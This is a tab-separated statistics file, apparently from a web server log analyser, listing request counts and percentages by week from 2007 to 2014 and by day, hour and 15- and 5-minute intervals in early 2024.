W	Rr	1836	0.108	2014	10	05
W	Rr	1662	0.097	2014	09	28
W	Rr	1843	0.108	2014	09	21
W	Rr	1678	0.098	2014	09	14
W	Rr	1598	0.094	2014	09	07
W	Rr	1418	0.083	2014	08	31
W	Rr	1584	0.093	2014	08	24
W	Rr	1571	0.092	2014	08	17
W	Rr	1727	0.101	2014	08	10
W	Rr	1927	0.113	2014	08	03
W	Rr	1691	0.099	2014	07	27
W	Rr	1702	0.100	2014	07	20
W	Rr	1624	0.095	2014	07	13
W	Rr	1831	0.107	2014	07	06
W	Rr	1867	0.109	2014	06	29
W	Rr	1927	0.113	2014	06	22
W	Rr	2134	0.125	2014	06	15
W	Rr	4851	0.284	2014	06	08
W	Rr	2293	0.134	2014	06	01
W	Rr	3180	0.186	2014	05	25
W	Rr	1468	0.086	2014	05	18
W	Rr	1808	0.106	2014	05	11
W	Rr	1998	0.117	2014	05	04
W	Rr	1876	0.110	2014	04	27
W	Rr	2330	0.137	2014	04	20
W	Rr	2565	0.150	2014	04	13
W	Rr	2652	0.155	2014	04	06
W	Rr	2574	0.151	2014	03	30
W	Rr	1186	0.070	2014	03	23
W	Rr	1305	0.076	2014	03	16
W	Rr	2273	0.133	2014	03	09
W	Rr	2231	0.131	2014	03	02
W	Rr	1925	0.113	2014	02	23
W	Rr	7060	0.414	2014	02	16
W	Rr	2854	0.167	2014	02	09
W	Rr	3190	0.187	2014	02	02
W	Rr	3743	0.219	2014	01	26
W	Rr	3643	0.213	2014	01	19
W	Rr	2961	0.174	2014	01	12
W	Rr	2319	0.136	2014	01	05
W	Rr	981	0.057	2013	12	29
W	Rr	1108	0.065	2013	12	22
W	Rr	1226	0.072	2013	12	15
W	Rr	1285	0.075	2013	12	08
W	Rr	1289	0.076	2013	12	01
W	Rr	1404	0.082	2013	11	24
W	Rr	1142	0.067	2013	11	17
W	Rr	1334	0.078	2013	11	10
W	Rr	1277	0.075	2013	11	03
W	Rr	1035	0.061	2013	10	27
W	Rr	1309	0.077	2013	10	20
W	Rr	1302	0.076	2013	10	13
W	Rr	1432	0.084	2013	10	06
W	Rr	1178	0.069	2013	09	29
W	Rr	947	0.055	2013	09	22
W	Rr	1254	0.073	2013	09	15
W	Rr	1099	0.064	2013	09	08
W	Rr	1053	0.062	2013	09	01
W	Rr	1010	0.059	2013	08	25
W	Rr	1102	0.065	2013	08	18
W	Rr	1063	0.062	2013	08	11
W	Rr	1105	0.065	2013	08	04
W	Rr	1377	0.081	2013	07	28
W	Rr	1498	0.088	2013	07	21
W	Rr	1295	0.076	2013	07	14
W	Rr	1237	0.072	2013	07	07
W	Rr	1003	0.059	2013	06	30
W	Rr	1275	0.075	2013	06	23
W	Rr	1072	0.063	2013	06	16
W	Rr	1249	0.073	2013	06	09
W	Rr	1521	0.089	2013	06	02
W	Rr	1256	0.074	2013	05	26
W	Rr	1091	0.064	2013	05	19
W	Rr	1359	0.080	2013	05	12
W	Rr	1130	0.066	2013	05	05
W	Rr	1215	0.071	2013	04	28
W	Rr	1368	0.080	2013	04	21
W	Rr	1318	0.077	2013	04	14
W	Rr	1408	0.083	2013	04	07
W	Rr	1277	0.075	2013	03	31
W	Rr	1452	0.085	2013	03	24
W	Rr	1418	0.083	2013	03	17
W	Rr	1217	0.071	2013	03	10
W	Rr	1490	0.087	2013	03	03
W	Rr	1353	0.079	2013	02	24
W	Rr	1268	0.074	2013	02	17
W	Rr	1274	0.075	2013	02	10
W	Rr	1153	0.068	2013	02	03
W	Rr	1266	0.074	2013	01	27
W	Rr	1271	0.074	2013	01	20
W	Rr	1449	0.085	2013	01	13
W	Rr	1253	0.073	2013	01	06
W	Rr	1309	0.077	2012	12	30
W	Rr	1156	0.068	2012	12	23
W	Rr	1336	0.078	2012	12	16
W	Rr	1575	0.092	2012	12	09
W	Rr	1087	0.064	2012	12	02
W	Rr	1376	0.081	2012	11	25
W	Rr	1136	0.067	2012	11	18
W	Rr	1341	0.079	2012	11	11
W	Rr	1418	0.083	2012	11	04
W	Rr	1103	0.065	2012	10	28
W	Rr	1200	0.070	2012	10	21
W	Rr	1382	0.081	2012	10	14
W	Rr	1127	0.066	2012	10	07
W	Rr	1187	0.070	2012	09	30
W	Rr	1172	0.069	2012	09	23
W	Rr	1034	0.061	2012	09	16
W	Rr	944	0.055	2012	09	09
W	Rr	958	0.056	2012	09	02
W	Rr	734	0.043	2012	08	26
W	Rr	881	0.052	2012	08	19
W	Rr	874	0.051	2012	08	12
W	Rr	973	0.057	2012	08	05
W	Rr	1010	0.059	2012	07	29
W	Rr	943	0.055	2012	07	22
W	Rr	1089	0.064	2012	07	15
W	Rr	888	0.052	2012	07	08
W	Rr	845	0.050	2012	07	01
W	Rr	1070	0.063	2012	06	24
W	Rr	1050	0.062	2012	06	17
W	Rr	1271	0.074	2012	06	10
W	Rr	957	0.056	2012	06	03
W	Rr	1249	0.073	2012	05	27
W	Rr	1055	0.062	2012	05	20
W	Rr	1392	0.082	2012	05	13
W	Rr	1140	0.067	2012	05	06
W	Rr	1807	0.106	2012	04	29
W	Rr	1225	0.072	2012	04	22
W	Rr	1264	0.074	2012	04	15
W	Rr	1075	0.063	2012	04	08
W	Rr	1261	0.074	2012	04	01
W	Rr	1345	0.079	2012	03	25
W	Rr	1254	0.073	2012	03	18
W	Rr	1478	0.087	2012	03	11
W	Rr	1503	0.088	2012	03	04
W	Rr	1532	0.090	2012	02	26
W	Rr	1464	0.086	2012	02	19
W	Rr	1154	0.068	2012	02	12
W	Rr	1240	0.073	2012	02	05
W	Rr	1088	0.064	2012	01	29
W	Rr	1125	0.066	2012	01	22
W	Rr	60	0.004	2012	01	15
W	Rr	1472	0.086	2012	01	08
W	Rr	1122	0.066	2012	01	01
W	Rr	888	0.052	2011	12	25
W	Rr	1360	0.080	2011	12	18
W	Rr	1486	0.087	2011	12	11
W	Rr	1330	0.078	2011	12	04
W	Rr	1094	0.064	2011	11	27
W	Rr	1062	0.062	2011	11	20
W	Rr	1123	0.066	2011	11	13
W	Rr	975	0.057	2011	11	06
W	Rr	1264	0.074	2011	10	30
W	Rr	1140	0.067	2011	10	23
W	Rr	1211	0.071	2011	10	16
W	Rr	1236	0.072	2011	10	09
W	Rr	1128	0.066	2011	10	02
W	Rr	1083	0.063	2011	09	25
W	Rr	1451	0.085	2011	09	18
W	Rr	1278	0.075	2011	09	11
W	Rr	1219	0.071	2011	09	04
W	Rr	1316	0.077	2011	08	28
W	Rr	1119	0.066	2011	08	21
W	Rr	1484	0.087	2011	08	14
W	Rr	1671	0.098	2011	08	07
W	Rr	1319	0.077	2011	07	31
W	Rr	1197	0.070	2011	07	24
W	Rr	1504	0.088	2011	07	17
W	Rr	1367	0.080	2011	07	10
W	Rr	1205	0.071	2011	07	03
W	Rr	1333	0.078	2011	06	26
W	Rr	1059	0.062	2011	06	19
W	Rr	1353	0.079	2011	06	12
W	Rr	1275	0.075	2011	06	05
W	Rr	983	0.058	2011	05	29
W	Rr	1262	0.074	2011	05	22
W	Rr	1374	0.081	2011	05	15
W	Rr	1076	0.063	2011	05	08
W	Rr	0	0.000	2011	05	01
W	Rr	0	0.000	2011	04	24
W	Rr	0	0.000	2011	04	17
W	Rr	0	0.000	2011	04	10
W	Rr	0	0.000	2011	04	03
W	Rr	0	0.000	2011	03	27
W	Rr	24	0.001	2011	03	20
W	Rr	1317	0.077	2011	03	13
W	Rr	1258	0.074	2011	03	06
W	Rr	1372	0.080	2011	02	27
W	Rr	1226	0.072	2011	02	20
W	Rr	1524	0.089	2011	02	13
W	Rr	1366	0.080	2011	02	06
W	Rr	958	0.056	2011	01	30
W	Rr	1273	0.075	2011	01	23
W	Rr	1560	0.091	2011	01	16
W	Rr	1472	0.086	2011	01	09
W	Rr	1310	0.077	2011	01	02
W	Rr	798	0.047	2010	12	26
W	Rr	935	0.055	2010	12	19
W	Rr	0	0.000	2010	12	12
W	Rr	0	0.000	2010	12	05
W	Rr	0	0.000	2010	11	28
W	Rr	0	0.000	2010	11	21
W	Rr	0	0.000	2010	11	14
W	Rr	0	0.000	2010	11	07
W	Rr	0	0.000	2010	10	31
W	Rr	0	0.000	2010	10	24
W	Rr	0	0.000	2010	10	17
W	Rr	0	0.000	2010	10	10
W	Rr	0	0.000	2010	10	03
W	Rr	0	0.000	2010	09	26
W	Rr	0	0.000	2010	09	19
W	Rr	0	0.000	2010	09	12
W	Rr	0	0.000	2010	09	05
W	Rr	0	0.000	2010	08	29
W	Rr	0	0.000	2010	08	22
W	Rr	0	0.000	2010	08	15
W	Rr	0	0.000	2010	08	08
W	Rr	0	0.000	2010	08	01
W	Rr	0	0.000	2010	07	25
W	Rr	0	0.000	2010	07	18
W	Rr	0	0.000	2010	07	11
W	Rr	0	0.000	2010	07	04
W	Rr	15	0.001	2010	06	27
W	Rr	914	0.054	2010	06	20
W	Rr	1104	0.065	2010	06	13
W	Rr	1096	0.064	2010	06	06
W	Rr	1171	0.069	2010	05	30
W	Rr	1115	0.065	2010	05	23
W	Rr	1170	0.069	2010	05	16
W	Rr	1334	0.078	2010	05	09
W	Rr	1109	0.065	2010	05	02
W	Rr	1067	0.063	2010	04	25
W	Rr	1212	0.071	2010	04	18
W	Rr	1054	0.062	2010	04	11
W	Rr	1325	0.078	2010	04	04
W	Rr	811	0.048	2010	03	28
W	Rr	1195	0.070	2010	03	21
W	Rr	1338	0.078	2010	03	14
W	Rr	1113	0.065	2010	03	07
W	Rr	1103	0.065	2010	02	28
W	Rr	1290	0.076	2010	02	21
W	Rr	0	0.000	2010	02	14
W	Rr	0	0.000	2010	02	07
W	Rr	0	0.000	2010	01	31
W	Rr	0	0.000	2010	01	24
W	Rr	0	0.000	2010	01	17
W	Rr	0	0.000	2010	01	10
W	Rr	0	0.000	2010	01	03
W	Rr	78	0.005	2009	12	27
W	Rr	945	0.055	2009	12	20
W	Rr	1140	0.067	2009	12	13
W	Rr	1323	0.078	2009	12	06
W	Rr	1518	0.089	2009	11	29
W	Rr	1352	0.079	2009	11	22
W	Rr	1346	0.079	2009	11	15
W	Rr	1416	0.083	2009	11	08
W	Rr	1734	0.102	2009	11	01
W	Rr	1035	0.061	2009	10	25
W	Rr	1297	0.076	2009	10	18
W	Rr	1267	0.074	2009	10	11
W	Rr	1440	0.084	2009	10	04
W	Rr	1521	0.089	2009	09	27
W	Rr	1121	0.066	2009	09	20
W	Rr	875	0.051	2009	09	13
W	Rr	1032	0.060	2009	09	06
W	Rr	1283	0.075	2009	08	30
W	Rr	1214	0.071	2009	08	23
W	Rr	1402	0.082	2009	08	16
W	Rr	1260	0.074	2009	08	09
W	Rr	1404	0.082	2009	08	02
W	Rr	1380	0.081	2009	07	26
W	Rr	1470	0.086	2009	07	19
W	Rr	1750	0.103	2009	07	12
W	Rr	1847	0.108	2009	07	05
W	Rr	1889	0.111	2009	06	28
W	Rr	1312	0.077	2009	06	21
W	Rr	1093	0.064	2009	06	14
W	Rr	1363	0.080	2009	06	07
W	Rr	1251	0.073	2009	05	31
W	Rr	1352	0.079	2009	05	24
W	Rr	1133	0.066	2009	05	17
W	Rr	1887	0.111	2009	05	10
W	Rr	1369	0.080	2009	05	03
W	Rr	1089	0.064	2009	04	26
W	Rr	1160	0.068	2009	04	19
W	Rr	1189	0.070	2009	04	12
W	Rr	1529	0.090	2009	04	05
W	Rr	1155	0.068	2009	03	29
W	Rr	1230	0.072	2009	03	22
W	Rr	1029	0.060	2009	03	15
W	Rr	1234	0.072	2009	03	08
W	Rr	1486	0.087	2009	03	01
W	Rr	1470	0.086	2009	02	22
W	Rr	1198	0.070	2009	02	15
W	Rr	1802	0.106	2009	02	08
W	Rr	1653	0.097	2009	02	01
W	Rr	1346	0.079	2009	01	25
W	Rr	1431	0.084	2009	01	18
W	Rr	1678	0.098	2009	01	11
W	Rr	1591	0.093	2009	01	04
W	Rr	886	0.052	2008	12	28
W	Rr	1148	0.067	2008	12	21
W	Rr	1428	0.084	2008	12	14
W	Rr	1508	0.088	2008	12	07
W	Rr	1194	0.070	2008	11	30
W	Rr	1070	0.063	2008	11	23
W	Rr	1396	0.082	2008	11	16
W	Rr	1255	0.074	2008	11	09
W	Rr	1314	0.077	2008	11	02
W	Rr	1397	0.082	2008	10	26
W	Rr	1638	0.096	2008	10	19
W	Rr	1298	0.076	2008	10	12
W	Rr	430	0.025	2008	10	05
W	Rr	723	0.042	2008	09	28
W	Rr	1308	0.077	2008	09	21
W	Rr	1242	0.073	2008	09	14
W	Rr	1409	0.083	2008	09	07
W	Rr	1142	0.067	2008	08	31
W	Rr	1022	0.060	2008	08	24
W	Rr	1062	0.062	2008	08	17
W	Rr	1188	0.070	2008	08	10
W	Rr	1232	0.072	2008	08	03
W	Rr	1050	0.062	2008	07	27
W	Rr	1272	0.075	2008	07	20
W	Rr	1305	0.076	2008	07	13
W	Rr	1093	0.064	2008	07	06
W	Rr	1182	0.069	2008	06	29
W	Rr	1937	0.114	2008	06	22
W	Rr	1493	0.087	2008	06	15
W	Rr	1083	0.063	2008	06	08
W	Rr	1283	0.075	2008	06	01
W	Rr	1432	0.084	2008	05	25
W	Rr	1726	0.101	2008	05	18
W	Rr	1580	0.093	2008	05	11
W	Rr	2661	0.156	2008	05	04
W	Rr	3648	0.214	2008	04	27
W	Rr	1400	0.082	2008	04	20
W	Rr	1365	0.080	2008	04	13
W	Rr	1213	0.071	2008	04	06
W	Rr	1670	0.098	2008	03	30
W	Rr	1211	0.071	2008	03	23
W	Rr	1144	0.067	2008	03	16
W	Rr	1301	0.076	2008	03	09
W	Rr	1292	0.076	2008	03	02
W	Rr	1427	0.084	2008	02	24
W	Rr	2207	0.129	2008	02	17
W	Rr	1124	0.066	2008	02	10
W	Rr	1561	0.091	2008	02	03
W	Rr	1533	0.090	2008	01	27
W	Rr	1389	0.081	2008	01	20
W	Rr	1133	0.066	2008	01	13
W	Rr	1404	0.082	2008	01	06
W	Rr	976	0.057	2007	12	30
W	Rr	801	0.047	2007	12	23
W	Rr	675	0.040	2007	12	16
W	*BT	R	26220	2024	01	28
D	Rr	107	0.006	2024	02	15
D	Rr	448	0.026	2024	02	14
D	Rr	525	0.031	2024	02	13
D	Rr	2139	0.125	2024	02	12
D	Rr	1353	0.079	2024	02	11
D	Rr	1260	0.074	2024	02	10
D	Rr	3204	0.188	2024	02	09
D	Rr	2214	0.130	2024	02	08
D	Rr	1884	0.110	2024	02	07
D	Rr	2688	0.158	2024	02	06
D	Rr	2472	0.145	2024	02	05
D	Rr	3138	0.184	2024	02	04
D	Rr	2478	0.145	2024	02	03
D	Rr	1632	0.096	2024	02	02
D	Rr	2634	0.154	2024	02	01
D	Rr	2976	0.174	2024	01	31
D	Rr	4860	0.285	2024	01	30
D	Rr	9912	0.581	2024	01	29
D	Rr	1728	0.101	2024	01	28
D	Rr	1752	0.103	2024	01	27
D	Rr	1380	0.081	2024	01	26
D	Rr	2742	0.161	2024	01	25
D	Rr	2958	0.173	2024	01	24
D	Rr	2466	0.145	2024	01	23
D	Rr	1902	0.111	2024	01	22
D	Rr	1530	0.090	2024	01	21
D	Rr	1194	0.070	2024	01	20
D	Rr	1446	0.085	2024	01	19
D	Rr	1902	0.111	2024	01	18
D	Rr	2124	0.124	2024	01	17
D	Rr	1632	0.096	2024	01	16
D	Rr	1800	0.105	2024	01	15
D	Rr	3000	0.176	2024	01	14
D	Rr	1842	0.108	2024	01	13
D	Rr	2844	0.167	2024	01	12
D	Rr	1596	0.094	2024	01	11
D	Rr	2184	0.128	2024	01	10
D	Rr	2460	0.144	2024	01	09
D	Rr	2712	0.159	2024	01	08
D	Rr	1686	0.099	2024	01	07
D	Rr	1374	0.081	2024	01	06
D	Rr	1218	0.071	2024	01	05
D	*BT	R	9912	2024	01	29
d	Rr	202798	11.884	Sun
d	Rr	278199	16.303	Mon
d	Rr	274479	16.085	Tue
d	Rr	279159	16.359	Wed
d	Rr	270084	15.827	Thu
d	Rr	255903	14.996	Fri
d	Rr	145818	8.545	Sat
H	Rr	5	0.000	2024	02	15	05
H	Rr	7	0.000	2024	02	15	04
H	Rr	38	0.002	2024	02	15	03
H	Rr	10	0.001	2024	02	15	02
H	Rr	37	0.002	2024	02	15	01
H	Rr	10	0.001	2024	02	15	00
H	Rr	25	0.001	2024	02	14	23
H	Rr	83	0.005	2024	02	14	22
H	Rr	5	0.000	2024	02	14	21
H	Rr	11	0.001	2024	02	14	20
H	Rr	11	0.001	2024	02	14	19
H	Rr	7	0.000	2024	02	14	18
H	Rr	2	0.000	2024	02	14	17
H	Rr	5	0.000	2024	02	14	16
H	Rr	4	0.000	2024	02	14	15
H	Rr	3	0.000	2024	02	14	14
H	Rr	2	0.000	2024	02	14	13
H	Rr	7	0.000	2024	02	14	12
H	Rr	8	0.000	2024	02	14	11
H	Rr	86	0.005	2024	02	14	10
H	Rr	1	0.000	2024	02	14	09
H	Rr	2	0.000	2024	02	14	08
H	Rr	4	0.000	2024	02	14	07
H	Rr	126	0.007	2024	02	14	06
H	Rr	24	0.001	2024	02	14	05
H	Rr	14	0.001	2024	02	14	04
H	Rr	10	0.001	2024	02	14	03
H	Rr	4	0.000	2024	02	14	02
H	Rr	4	0.000	2024	02	14	01
H	Rr	0	0.000	2024	02	14	00
H	Rr	8	0.000	2024	02	13	23
H	Rr	12	0.001	2024	02	13	22
H	Rr	0	0.000	2024	02	13	21
H	Rr	8	0.000	2024	02	13	20
H	Rr	20	0.001	2024	02	13	19
H	Rr	6	0.000	2024	02	13	18
H	Rr	20	0.001	2024	02	13	17
H	Rr	10	0.001	2024	02	13	16
H	Rr	8	0.000	2024	02	13	15
H	Rr	170	0.010	2024	02	13	14
H	Rr	12	0.001	2024	02	13	13
H	Rr	12	0.001	2024	02	13	12
H	Rr	12	0.001	2024	02	13	11
H	Rr	4	0.000	2024	02	13	10
H	Rr	34	0.002	2024	02	13	09
H	Rr	14	0.001	2024	02	13	08
H	Rr	14	0.001	2024	02	13	07
H	Rr	2	0.000	2024	02	13	06
H	Rr	9	0.001	2024	02	13	05
H	Rr	9	0.001	2024	02	13	04
H	Rr	99	0.006	2024	02	13	03
H	Rr	12	0.001	2024	02	13	02
H	Rr	15	0.001	2024	02	13	01
H	Rr	15	0.001	2024	02	13	00
H	Rr	99	0.006	2024	02	12	23
H	Rr	102	0.006	2024	02	12	22
H	Rr	3	0.000	2024	02	12	21
H	Rr	102	0.006	2024	02	12	20
H	Rr	39	0.002	2024	02	12	19
H	Rr	0	0.000	2024	02	12	18
H	Rr	138	0.008	2024	02	12	17
H	Rr	114	0.007	2024	02	12	16
H	Rr	105	0.006	2024	02	12	15
H	Rr	540	0.032	2024	02	12	14
H	Rr	513	0.030	2024	02	12	13
H	Rr	15	0.001	2024	02	12	12
H	Rr	9	0.001	2024	02	12	11
H	Rr	3	0.000	2024	02	12	10
H	Rr	9	0.001	2024	02	12	09
H	Rr	18	0.001	2024	02	12	08
H	Rr	24	0.001	2024	02	12	07
H	Rr	18	0.001	2024	02	12	06
H	*BT	R	1638	2024	01	29	20
h	Rr	66428	3.893	00
h	Rr	64159	3.760	01
h	Rr	65207	3.821	02
h	Rr	66080	3.872	03
h	Rr	65030	3.811	04
h	Rr	62451	3.660	05
h	Rr	59070	3.462	06
h	Rr	58883	3.451	07
h	Rr	55663	3.262	08
h	Rr	51958	3.045	09
h	Rr	56718	3.324	10
h	Rr	59863	3.508	11
h	Rr	59038	3.460	12
h	Rr	64781	3.796	13
h	Rr	79794	4.676	14
h	Rr	84560	4.955	15
h	Rr	93217	5.463	16
h	Rr	94888	5.561	17
h	Rr	94197	5.520	18
h	Rr	91013	5.334	19
h	Rr	88262	5.172	20
h	Rr	82574	4.839	21
h	Rr	72002	4.219	22
h	Rr	70604	4.138	23
4	Rr	2	0.000	2024	02	15	05	45
4	Rr	1	0.000	2024	02	15	05	30
4	Rr	1	0.000	2024	02	15	05	15
4	Rr	1	0.000	2024	02	15	05	00
4	Rr	1	0.000	2024	02	15	04	45
4	Rr	0	0.000	2024	02	15	04	30
4	Rr	3	0.000	2024	02	15	04	15
4	Rr	3	0.000	2024	02	15	04	00
4	Rr	33	0.002	2024	02	15	03	45
4	Rr	1	0.000	2024	02	15	03	30
4	Rr	1	0.000	2024	02	15	03	15
4	Rr	3	0.000	2024	02	15	03	00
4	Rr	2	0.000	2024	02	15	02	45
4	Rr	3	0.000	2024	02	15	02	30
4	Rr	1	0.000	2024	02	15	02	15
4	Rr	4	0.000	2024	02	15	02	00
4	Rr	32	0.002	2024	02	15	01	45
4	Rr	2	0.000	2024	02	15	01	30
4	Rr	1	0.000	2024	02	15	01	15
4	Rr	2	0.000	2024	02	15	01	00
4	Rr	4	0.000	2024	02	15	00	45
4	Rr	1	0.000	2024	02	15	00	30
4	Rr	5	0.000	2024	02	15	00	15
4	Rr	0	0.000	2024	02	15	00	00
4	Rr	1	0.000	2024	02	14	23	45
4	Rr	1	0.000	2024	02	14	23	30
4	Rr	0	0.000	2024	02	14	23	15
4	Rr	23	0.001	2024	02	14	23	00
4	Rr	9	0.001	2024	02	14	22	45
4	Rr	73	0.004	2024	02	14	22	30
4	Rr	1	0.000	2024	02	14	22	15
4	Rr	0	0.000	2024	02	14	22	00
4	Rr	1	0.000	2024	02	14	21	45
4	Rr	1	0.000	2024	02	14	21	30
4	Rr	2	0.000	2024	02	14	21	15
4	Rr	1	0.000	2024	02	14	21	00
4	Rr	3	0.000	2024	02	14	20	45
4	Rr	0	0.000	2024	02	14	20	30
4	Rr	2	0.000	2024	02	14	20	15
4	Rr	6	0.000	2024	02	14	20	00
4	Rr	4	0.000	2024	02	14	19	45
4	Rr	3	0.000	2024	02	14	19	30
4	Rr	2	0.000	2024	02	14	19	15
4	Rr	2	0.000	2024	02	14	19	00
4	Rr	2	0.000	2024	02	14	18	45
4	Rr	4	0.000	2024	02	14	18	30
4	Rr	1	0.000	2024	02	14	18	15
4	Rr	0	0.000	2024	02	14	18	00
4	Rr	1	0.000	2024	02	14	17	45
4	Rr	0	0.000	2024	02	14	17	30
4	Rr	0	0.000	2024	02	14	17	15
4	Rr	1	0.000	2024	02	14	17	00
4	Rr	0	0.000	2024	02	14	16	45
4	Rr	0	0.000	2024	02	14	16	30
4	Rr	3	0.000	2024	02	14	16	15
4	Rr	2	0.000	2024	02	14	16	00
4	Rr	4	0.000	2024	02	14	15	45
4	Rr	0	0.000	2024	02	14	15	30
4	Rr	0	0.000	2024	02	14	15	15
4	Rr	0	0.000	2024	02	14	15	00
4	Rr	1	0.000	2024	02	14	14	45
4	Rr	0	0.000	2024	02	14	14	30
4	Rr	0	0.000	2024	02	14	14	15
4	Rr	2	0.000	2024	02	14	14	00
4	Rr	0	0.000	2024	02	14	13	45
4	Rr	0	0.000	2024	02	14	13	30
4	Rr	2	0.000	2024	02	14	13	15
4	Rr	0	0.000	2024	02	14	13	00
4	Rr	0	0.000	2024	02	14	12	45
4	Rr	1	0.000	2024	02	14	12	30
4	Rr	4	0.000	2024	02	14	12	15
4	Rr	2	0.000	2024	02	14	12	00
4	Rr	0	0.000	2024	02	14	11	45
4	Rr	2	0.000	2024	02	14	11	30
4	Rr	1	0.000	2024	02	14	11	15
4	Rr	5	0.000	2024	02	14	11	00
4	Rr	0	0.000	2024	02	14	10	45
4	Rr	0	0.000	2024	02	14	10	30
4	Rr	0	0.000	2024	02	14	10	15
4	Rr	86	0.005	2024	02	14	10	00
4	Rr	0	0.000	2024	02	14	09	45
4	Rr	1	0.000	2024	02	14	09	30
4	Rr	0	0.000	2024	02	14	09	15
4	Rr	0	0.000	2024	02	14	09	00
4	Rr	0	0.000	2024	02	14	08	45
4	Rr	0	0.000	2024	02	14	08	30
4	Rr	0	0.000	2024	02	14	08	15
4	Rr	2	0.000	2024	02	14	08	00
4	Rr	0	0.000	2024	02	14	07	45
4	Rr	2	0.000	2024	02	14	07	30
4	Rr	0	0.000	2024	02	14	07	15
4	Rr	2	0.000	2024	02	14	07	00
4	Rr	1	0.000	2024	02	14	06	45
4	Rr	119	0.007	2024	02	14	06	30
4	Rr	1	0.000	2024	02	14	06	15
4	Rr	5	0.000	2024	02	14	06	00
4	*BT	R	975	2023	05	08	18	00
6	Rr	16794	0.984	00	00
6	Rr	15753	0.923	00	15
6	Rr	17035	0.998	00	30
6	Rr	16846	0.987	00	45
6	Rr	15146	0.888	01	00
6	Rr	16356	0.958	01	15
6	Rr	15682	0.919	01	30
6	Rr	16975	0.995	01	45
6	Rr	14538	0.852	02	00
6	Rr	17507	1.026	02	15
6	Rr	16877	0.989	02	30
6	Rr	16285	0.954	02	45
6	Rr	15830	0.928	03	00
6	Rr	15665	0.918	03	15
6	Rr	15998	0.938	03	30
6	Rr	18587	1.089	03	45
6	Rr	15797	0.926	04	00
6	Rr	15195	0.890	04	15
6	Rr	16453	0.964	04	30
6	Rr	17585	1.031	04	45
6	Rr	15402	0.903	05	00
6	Rr	16517	0.968	05	15
6	Rr	14880	0.872	05	30
6	Rr	15652	0.917	05	45
6	Rr	16087	0.943	06	00
6	Rr	14433	0.846	06	15
6	Rr	15013	0.880	06	30
6	Rr	13537	0.793	06	45
6	Rr	15235	0.893	07	00
6	Rr	15100	0.885	07	15
6	Rr	14400	0.844	07	30
6	Rr	14148	0.829	07	45
6	Rr	13815	0.810	08	00
6	Rr	14060	0.824	08	15
6	Rr	14836	0.869	08	30
6	Rr	12952	0.759	08	45
6	Rr	12349	0.724	09	00
6	Rr	12732	0.746	09	15
6	Rr	14683	0.860	09	30
6	Rr	12194	0.715	09	45
6	Rr	12907	0.756	10	00
6	Rr	14014	0.821	10	15
6	Rr	15289	0.896	10	30
6	Rr	14508	0.850	10	45
6	Rr	16540	0.969	11	00
6	Rr	14817	0.868	11	15
6	Rr	15261	0.894	11	30
6	Rr	13245	0.776	11	45
6	Rr	15630	0.916	12	00
6	Rr	13948	0.817	12	15
6	Rr	13898	0.814	12	30
6	Rr	15562	0.912	12	45
6	Rr	14788	0.867	13	00
6	Rr	17572	1.030	13	15
6	Rr	16832	0.986	13	30
6	Rr	15589	0.914	13	45
6	Rr	18743	1.098	14	00
6	Rr	21704	1.272	14	15
6	Rr	20326	1.191	14	30
6	Rr	19021	1.115	14	45
6	Rr	19890	1.166	15	00
6	Rr	19945	1.169	15	15
6	Rr	22776	1.335	15	30
6	Rr	21949	1.286	15	45
6	Rr	23152	1.357	16	00
6	Rr	24045	1.409	16	15
6	Rr	22669	1.328	16	30
6	Rr	23351	1.368	16	45
6	Rr	24777	1.452	17	00
6	Rr	23791	1.394	17	15
6	Rr	23761	1.392	17	30
6	Rr	22559	1.322	17	45
6	Rr	24929	1.461	18	00
6	Rr	22351	1.310	18	15
6	Rr	23203	1.360	18	30
6	Rr	23714	1.390	18	45
6	Rr	22938	1.344	19	00
6	Rr	20825	1.220	19	15
6	Rr	22601	1.324	19	30
6	Rr	24649	1.444	19	45
6	Rr	21787	1.277	20	00
6	Rr	22809	1.337	20	15
6	Rr	21087	1.236	20	30
6	Rr	22579	1.323	20	45
6	Rr	21124	1.238	21	00
6	Rr	21124	1.238	21	15
6	Rr	19299	1.131	21	30
6	Rr	21027	1.232	21	45
6	Rr	17635	1.033	22	00
6	Rr	18197	1.066	22	15
6	Rr	18242	1.069	22	30
6	Rr	17928	1.051	22	45
6	Rr	19164	1.123	23	00
6	Rr	19418	1.138	23	15
6	Rr	15377	0.901	23	30
6	Rr	16645	0.975	23	45
5	Rr	2	0.000	2024	02	15	05	55
5	Rr	0	0.000	2024	02	15	05	50
5	Rr	0	0.000	2024	02	15	05	45
5	Rr	0	0.000	2024	02	15	05	40
5	Rr	1	0.000	2024	02	15	05	35
5	Rr	0	0.000	2024	02	15	05	30
5	Rr	1	0.000	2024	02	15	05	25
5	Rr	0	0.000	2024	02	15	05	20
5	Rr	0	0.000	2024	02	15	05	15
5	Rr	0	0.000	2024	02	15	05	10
5	Rr	0	0.000	2024	02	15	05	05
5	Rr	1	0.000	2024	02	15	05	00
5	Rr	0	0.000	2024	02	15	04	55
5	Rr	1	0.000	2024	02	15	04	50
5	Rr	0	0.000	2024	02	15	04	45
5	Rr	0	0.000	2024	02	15	04	40
5	Rr	0	0.000	2024	02	15	04	35
5	Rr	0	0.000	2024	02	15	04	30
5	Rr	0	0.000	2024	02	15	04	25
5	Rr	0	0.000	2024	02	15	04	20
5	Rr	3	0.000	2024	02	15	04	15
5	Rr	0	0.000	2024	02	15	04	10
5	Rr	3	0.000	2024	02	15	04	05
5	Rr	0	0.000	2024	02	15	04	00
5	Rr	32	0.002	2024	02	15	03	55
5	Rr	0	0.000	2024	02	15	03	50
5	Rr	1	0.000	2024	02	15	03	45
5	Rr	0	0.000	2024	02	15	03	40
5	Rr	1	0.000	2024	02	15	03	35
5	Rr	0	0.000	2024	02	15	03	30
5	Rr	1	0.000	2024	02	15	03	25
5	Rr	0	0.000	2024	02	15	03	20
5	Rr	0	0.000	2024	02	15	03	15
5	Rr	0	0.000	2024	02	15	03	10
5	Rr	1	0.000	2024	02	15	03	05
5	Rr	2	0.000	2024	02	15	03	00
5	Rr	1	0.000	2024	02	15	02	55
5	Rr	1	0.000	2024	02	15	02	50
5	Rr	0	0.000	2024	02	15	02	45
5	Rr	0	0.000	2024	02	15	02	40
5	Rr	1	0.000	2024	02	15	02	35
5	Rr	2	0.000	2024	02	15	02	30
5	Rr	0	0.000	2024	02	15	02	25
5	Rr	0	0.000	2024	02	15	02	20
5	Rr	1	0.000	2024	02	15	02	15
5	Rr	1	0.000	2024	02	15	02	10
5	Rr	1	0.000	2024	02	15	02	05
5	Rr	2	0.000	2024	02	15	02	00
5	Rr	0	0.000	2024	02	15	01	55
5	Rr	32	0.002	2024	02	15	01	50
5	Rr	0	0.000	2024	02	15	01	45
5	Rr	1	0.000	2024	02	15	01	40
